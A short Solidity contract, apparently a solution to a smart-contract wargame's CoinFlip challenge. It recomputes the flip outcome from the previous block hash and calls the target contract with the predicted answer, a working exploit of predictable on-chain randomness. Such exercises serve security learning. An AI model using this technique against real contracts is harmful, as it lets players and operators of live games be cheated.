// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./CoinFlip.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlipNostradamus is Ownable {
    using SafeMath for uint256;

    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip coinFlipContract =
        CoinFlip(0xd7ab381584eb8f96c493DaaD45782f940e9F3558);

    constructor() {}

    function flipCorrect() public onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}
